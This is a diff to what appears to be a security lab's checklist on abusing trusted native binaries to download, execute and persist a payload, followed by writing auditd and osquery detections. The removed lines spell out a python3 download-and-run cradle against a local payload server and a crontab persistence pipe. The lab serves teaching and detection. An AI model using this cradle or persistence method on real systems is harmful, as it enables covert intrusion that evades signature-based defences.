@@ -28,32 +28,23 @@ system's own trusted binaries.
 
 ## Do
 
-1. [ ] Run the demo to see the full LOLBin chain:
-   ```bash
-   make demo
-   ```
-   Note which binaries are used for each step (download, exec, persist).
+1. [ ] Build the download→exec→persist chain yourself using only native binaries, before
+   watching the worked run. Stand up a local payload server, pull `stage2.py` down with a
+   trusted interpreter instead of a flagged downloader, execute it without dropping a
+   recognisable binary, and persist via a native scheduler. (Which interpreter already
+   present can fetch a URL? Which can run code straight from a file or string?) `make demo`
+   runs the validated chain — use it afterwards to check which binary you used per step.
 
-2. [ ] Read `lolbins_demo.py`. Trace each technique:
-   - Step 1: How does `python3 -c "import urllib.request; ..."` replace `curl`?
-   - Step 2: What does `exec(open(PATH).read())` do, and why does it evade signatures?
-   - Step 3: How does `(crontab -l; echo ...) | crontab -` avoid writing to `/etc/cron.d`?
+2. [ ] Read `lolbins_demo.py` and explain why each step evades signature-based blocking:
+   - How does the chosen interpreter replace a dedicated downloader like `curl`?
+   - What makes executing code read from a file evade binary signatures?
+   - How does piping into the scheduler avoid writing a flagged file under `/etc/cron.d`?
 
-3. [ ] Shell into the container and try the download cradle manually:
-   ```bash
-   make shell
-   # Simulate a payload server on port 9999 (background):
-   python3 -m http.server 9999 --directory /lab/payload &
-   # Download via python3 urllib:
-   python3 -c "import urllib.request; open('/tmp/test.py','wb').write(urllib.request.urlopen('http://127.0.0.1:9999/stage2.py').read())"
-   python3 /tmp/test.py
-   ```
-
-4. [ ] For each detection artifact in Step 4:
-   - Write the auditd rule that would catch the download (python3 opening a TCP socket)
+3. [ ] For each detection artifact the chain leaves:
+   - Write the auditd rule that would catch the download (an interpreter opening a TCP socket)
    - Write the osquery query that would find the crontab entry writing to /tmp
 
-5. [ ] Read the Windows LOLBAS table (Step 5). For each Windows binary:
+4. [ ] Read the Windows LOLBAS table the lab ships. For each Windows binary:
    - Look up the entry on [LOLBAS](https://lolbas-project.github.io/)
    - What is its normal purpose? What makes the malicious use hard to block?
 
